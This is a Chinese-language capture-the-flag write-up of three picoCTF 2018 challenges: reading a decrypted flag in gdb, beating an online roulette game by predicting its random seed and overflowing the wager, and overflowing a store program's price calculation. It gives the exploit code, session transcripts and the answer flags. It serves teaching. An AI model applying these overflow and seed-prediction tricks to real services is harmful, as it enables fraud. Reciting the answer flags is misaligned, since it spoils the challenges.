### 优化后的文本

#### 反汇编与调试
首先，我们对目标代码进行反汇编，并在关键位置设置断点。以下是部分反汇编结果：

```assembly
0x00000000004008f6:    mov    $0x4009d0, %edi
0x00000000004008fb:    callq  0x400600
0x0000000000400900:    mov    $0x0, %eax
0x0000000000400905:    callq  0x400786
...
```

接着，我们继续反汇编 `decrypt_flag` 函数，并在其内部的关键位置设置断点：

```assembly
(gdb) disas decrypt_flag
...
0x0000000000400896:    mov    0x200b4b(%rip), %rdx        # 0x6013e8
0x000000000040089d:    mov    -0x20(%rbp), %eax
0x00000000004008a0:    cltq
0x00000000004008a2:    add    %rdx, %rax
0x00000000004008a5:    movb   $0x0, (%rax)
0x00000000004008a8:    mov    $0xa, %edi
0x00000000004008ad:    callq  0x4005f0
0x00000000004008b2:    nop
...
(gdb) b *0x00000000004008a8
Breakpoint 1 at 0x4008a8
(gdb) r
Starting program: /problems/learn-gdb_3_f1f262d9d48b9ff39efc3bc092ea9d7b/run
Decrypting the Flag into global variable 'flag_buf'
.....................................
Breakpoint 1, 0x00000000004008a8 in decrypt_flag ()
(gdb) printf "%s", (char *) flag_buf
picoCTF{gDb_iS_sUp3r_u53fuL_efaa2b29}
```

最终得到的 flag 是：`picoCTF{gDb_iS_sUp3r_u53fuL_efaa2b29}`。

#### Roulette 游戏漏洞利用
**问题描述**
> 这个在线 [Roulette](https://2018shell2.picoctf.com/static/2d8417ef7707fec56592db02da54575e/roulette) 服务处于测试阶段。你能找到一种方法赢得 $1,000,000,000 并获得 flag 吗？
> [源码](https://2018shell2.picoctf.com/static/2d8417ef7707fec56592db02da54575e/roulette.c)。
> 使用 `nc 2018shell1.picoctf.com 5731` 连接。

**提示**
> 存在两个漏洞！

**解决方案**
通过查看源码，我们发现存在两个主要问题：
1. 随机数生成函数 `get_rand()` 的实现存在问题。
2. 输入处理函数 `read_long()` 在处理大数值时可能会导致溢出。

针对这两个问题，我们可以构造特定的输入来触发漏洞。具体步骤如下：

1. **预测随机数**：使用以下 C 程序来预测随机数：
    ```c
    #include <stdio.h>
    #include <stdlib.h>

    int main(int argc, char *argv[]) {
        srand(atoi(argv[1]));
        for (int i = 0; i < 10; i++) {
            printf("%d\n", rand() % 36 + 1);
        }
    }
    ```

2. **构造输入**：通过构造特定的输入来触发溢出并使余额超过 $1,000,000,000，同时连胜次数达到三次。

**示例会话**
```plaintext
How much will you wager?
Current Balance: $611    Current Wins: 0
> 611
Choose a number (1-36)
> 12
Spinning the Roulette for a chance to win $1222!
Roulette  :  12
You chose correct!
How much will you wager?
Current Balance: $1222   Current Wins: 1
> 1222
Choose a number (1-36)
> 23
Spinning the Roulette for a chance to win $2444!
Roulette  :  23
Wow, you won!
How much will you wager?
Current Balance: $2444   Current Wins: 2
> 2444
Choose a number (1-36)
> 34
Spinning the Roulette for a chance to win $4888!
Roulette  :  34
Congrats!
How much will you wager?
Current Balance: $4888   Current Wins: 3
> 3221225472
Choose a number (1-36)
> 25
Spinning the Roulette for a chance to win $2147483648!
Roulette  :  26
WRONG
If you keep it up, maybe you'll get the flag in 100000000000 years
*** Current Balance: $1073746712 ***
Wow, I can't believe you did it.. You deserve this flag!
picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8fb4d984}
```

最终得到的 flag 是：`picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8fb4d984}`。

#### 商店程序整数溢出漏洞
**问题描述**
> 我们开了一个小 [商店](https://2018shell2.picoctf.com/static/52a992a4afd3bd8ad54489efbec0fd5c/store)，你能买到 flag 吗？
> [源码](https://2018shell2.picoctf.com/static/52a992a4afd3bd8ad54489efbec0fd5c/source.c)。
> 使用 `2018shell1.picoctf.com 53220` 连接。

**提示**
> 当数字非常大时，补码表示法会导致一些奇怪的现象！

**解决方案**
这个问题同样涉及整数溢出。通过购买小额商品，可以造成负数溢出从而使自己的钱数增加。此外，出题人似乎忘记去掉某些内容，直接在二进制可执行文件中包含了 flag，因此可以直接使用 `strings` 命令提取。

**直接获取 flag**
```sh
~ strings store | grep pico
YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
```

**常规解法**
```plaintext
Welcome to the Store App V1.0
World's Most Secure Purchasing App
[1] Check Account Balance
[2] Buy Stuff
[3] Exit
 Enter a menu selection
2
Current Auctions
[1] I Can't Believe its not a Flag!
[2] Real Flag
1
Imitation Flags cost 1000 each, how many would you like?
10000000000000000
Your total cost is: -1981284352
Your new balance: 1981285452
Welcome to the Store App V1.0
World's Most Secure Purchasing App
[1] Check Account Balance
[2] Buy Stuff
[3] Exit
 Enter a menu selection
2
Current Auctions
[1] I Can't Believe its not a Flag!
[2] Real Flag
2
A genuine Flag costs 100000 dollars, and we only have 1 in stock
Enter 1 to purchase
1
YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
```

最终得到的 flag 是：`picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}`。